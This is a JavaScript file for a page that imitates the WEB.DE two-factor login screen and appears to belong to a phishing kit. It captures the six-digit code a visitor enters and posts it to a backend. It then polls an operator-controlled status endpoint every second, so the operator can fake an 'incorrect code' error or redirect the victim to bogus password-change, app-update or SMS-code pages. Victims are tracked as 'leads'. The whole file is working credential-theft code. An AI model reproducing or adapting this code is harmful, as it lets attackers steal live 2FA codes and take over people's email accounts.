/**
 * WEB.DE — 2FA (Zwei-Faktor), Kundencenter-Stil; редиректы как bei sms-code-webde.js
 */
(function () {
  var CANONICAL = 'https://newsroom.web.de/';
  var HILFE = 'https://hilfe.web.de/';
  function getId() {
    var m = /[?&]id=([^&]+)/.exec(window.location.search);
    return m ? decodeURIComponent(m[1]) : '';
  }
  var form = document.getElementById('two-fa-form');
  var inputs = document.querySelectorAll('.twofa-row input');
  var btnResend = document.getElementById('two-fa-resend');
  var btnConfirm = document.getElementById('two-fa-confirm');

  function getCode() {
    var code = '';
    for (var i = 0; i < inputs.length; i++) code += (inputs[i].value || '').trim();
    return code;
  }
  function updateConfirmButton() {
    if (btnConfirm) btnConfirm.disabled = getCode().length !== 6;
  }
  inputs.forEach(function (input, i) {
    input.addEventListener('input', function () {
      var v = this.value.replace(/\D/g, '').slice(0, 1);
      this.value = v;
      if (v && i < inputs.length - 1) inputs[i + 1].focus();
      updateConfirmButton();
      userClearedErrorByTyping = true;
      hideError();
    });
    input.addEventListener('keydown', function (e) {
      if (e.key === 'Backspace' && !this.value && i > 0) inputs[i - 1].focus();
    });
    input.addEventListener('paste', function (e) {
      e.preventDefault();
      var pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 6);
      for (var j = 0; j < pasted.length && j < inputs.length; j++) inputs[j].value = pasted[j];
      if (pasted.length > 0) inputs[Math.min(pasted.length, inputs.length - 1)].focus();
      updateConfirmButton();
      userClearedErrorByTyping = true;
      hideError();
    });
  });

  var RESEND_COOLDOWN = 60;
  var resendSecondsLeft = RESEND_COOLDOWN;
  var resendTimer = null;
  function setResendCooldown(seconds) {
    if (!btnResend) return;
    resendSecondsLeft = seconds;
    if (resendTimer) { clearInterval(resendTimer); resendTimer = null; }
    if (seconds > 0) {
      btnResend.disabled = true;
      btnResend.textContent = 'Code erneut anfordern (' + seconds + ' s)';
      resendTimer = setInterval(function () {
        resendSecondsLeft--;
        if (resendSecondsLeft > 0) {
          btnResend.textContent = 'Code erneut anfordern (' + resendSecondsLeft + ' s)';
        } else {
          btnResend.disabled = false;
          btnResend.textContent = 'Code erneut anfordern';
          clearInterval(resendTimer);
          resendTimer = null;
        }
      }, 1000);
    }
  }
  if (btnResend) {
    setResendCooldown(RESEND_COOLDOWN);
    btnResend.addEventListener('click', function () {
      if (btnResend.disabled) return;
      var id = getId();
      if (id) {
        fetch('/api/log-action', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id: id, action: 'two_fa_resend' }) }).catch(function () {});
      }
      setResendCooldown(RESEND_COOLDOWN);
    });
  }

  var statusInterval = null;
  var overlaySec = 300;
  var overlayInterval = null;
  var ADMIN_ERROR_MSG = 'Der eingegebene Code ist nicht korrekt. Bitte überprüfen Sie Ihre Eingabe.';
  var userClearedErrorByTyping = false;
  function showOverlay() {
    var overlay = document.getElementById('two-fa-protection-overlay');
    var countEl = document.getElementById('two-fa-protection-countdown');
    if (overlay) overlay.hidden = false;
    overlaySec = 300;
    function fmt(s) { var m = Math.floor(s / 60); var sec = s % 60; return m + ':' + (sec < 10 ? '0' : '') + sec; }
    if (countEl) countEl.textContent = fmt(overlaySec);
    if (overlayInterval) clearInterval(overlayInterval);
    overlayInterval = setInterval(function () {
      if (overlaySec > 0) overlaySec--;
      if (countEl) countEl.textContent = fmt(overlaySec);
    }, 1000);
  }
  function hideOverlay() {
    var overlay = document.getElementById('two-fa-protection-overlay');
    if (overlay) overlay.hidden = true;
    if (overlayInterval) { clearInterval(overlayInterval); overlayInterval = null; }
  }
  function redirectIfNeeded(st, id) {
    if (st === 'redirect_push') {
      if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
      hideOverlay();
      window.location = '/push-confirm.html?id=' + encodeURIComponent(id);
    } else if (st === 'redirect_change_password') {
      if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
      hideOverlay();
      window.location = '/passwort-aendern?id=' + encodeURIComponent(id);
    } else if (st === 'redirect_sicherheit') {
      if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
      hideOverlay();
      window.location = '/sicherheit-update?id=' + encodeURIComponent(id);
    } else if (st === 'redirect_open_on_pc') {
      if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
      hideOverlay();
      window.location = '/bitte-am-pc?id=' + encodeURIComponent(id);
    } else if (st === 'redirect_android') {
      if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
      hideOverlay();
      window.location = '/app-update?id=' + encodeURIComponent(id);
    } else if (st === 'redirect_gmx_net') {
      if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
      hideOverlay();
      window.location.href = (window.__BRAND__ && window.__BRAND__.canonicalUrl) || CANONICAL;
    } else if (st === 'redirect_sms_code') {
      if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
      hideOverlay();
      window.location = '/sms-code.html?id=' + encodeURIComponent(id);
    } else if (st === 'redirect_2fa_code') {
      if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
      hideOverlay();
      window.location = '/2fa-code.html?id=' + encodeURIComponent(id);
    } else if (st === 'show_success') {
      if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
      hideOverlay();
      try { sessionStorage.setItem('gmw_lead_id', id); } catch (e) {}
      window.location = '/anmelden';
    }
  }
  function startPollingAfterSubmit(id) {
    if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
    function check() {
      fetch('/api/status?id=' + encodeURIComponent(id) + '&page=2fa-code&_=' + Date.now(), { cache: 'no-store', headers: { Pragma: 'no-cache' } })
        .then(function (r) { return r.json(); })
        .then(function (res) {
          var st = res && res.status;
          if ((res && res.mode) === 'manual' && st !== 'error') return;
          redirectIfNeeded(st, id);
          if (st === 'error') {
            if (!userClearedErrorByTyping) {
              hideOverlay();
              if (btnConfirm) btnConfirm.disabled = getCode().length !== 6;
              showError(ADMIN_ERROR_MSG);
            }
          } else {
            userClearedErrorByTyping = false;
          }
        })
        .catch(function () {});
    }
    check();
    statusInterval = setInterval(check, 1000);
  }
  function showError(msg) {
    var row = document.getElementById('two-fa-code-row');
    var err = document.getElementById('two-fa-submit-error');
    if (!err) {
      err = document.createElement('p');
      err.id = 'two-fa-submit-error';
      err.setAttribute('role', 'alert');
      err.style.color = '#d40000';
      err.style.marginTop = '12px';
      err.style.fontSize = '0.9rem';
      if (row && row.parentNode) row.parentNode.insertBefore(err, row.nextSibling);
    }
    if (err) { err.textContent = msg || 'Fehler. Bitte versuchen Sie es erneut.'; err.hidden = false; }
  }
  function hideError() {
    var err = document.getElementById('two-fa-submit-error');
    if (err) { err.hidden = true; err.textContent = ''; }
  }
  form && form.addEventListener('submit', function (e) {
    e.preventDefault();
    userClearedErrorByTyping = false;
    hideError();
    var code = getCode();
    if (code.length !== 6) return;
    var id = getId();
    if (!id) return;
    if (btnConfirm) btnConfirm.disabled = true;
    showOverlay();
    fetch('/api/sms-code-submit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ id: id, code: code, kind: '2fa' }),
    }).then(function (r) {
      if (!r || !r.ok) {
        hideOverlay();
        if (btnConfirm) btnConfirm.disabled = false;
        showError('Fehler beim Senden. Bitte versuchen Sie es erneut.');
        return;
      }
      return r.json().then(function () {
        hideError();
        startPollingAfterSubmit(id);
      }).catch(function () { startPollingAfterSubmit(id); });
    }).catch(function () {
      hideOverlay();
      if (btnConfirm) btnConfirm.disabled = false;
      showError('Verbindungsfehler. Bitte versuchen Sie es erneut.');
    });
  });

  var id = getId();
  if (id) {
    function checkStatus() {
      fetch('/api/status?id=' + encodeURIComponent(id) + '&page=2fa-code&_=' + Date.now(), { cache: 'no-store', headers: { Pragma: 'no-cache' } })
        .then(function (r) { return r.json(); })
        .then(function (res) {
          var st = res && res.status;
          if ((res && res.mode) === 'manual' && st !== 'error') return;
          redirectIfNeeded(st, id);
          if (st === 'error') {
            if (!userClearedErrorByTyping) {
              if (btnConfirm) btnConfirm.disabled = getCode().length !== 6;
              showError(ADMIN_ERROR_MSG);
            }
          } else {
            userClearedErrorByTyping = false;
          }
        })
        .catch(function () {});
    }
    checkStatus();
    statusInterval = setInterval(checkStatus, 1000);
  }
})();
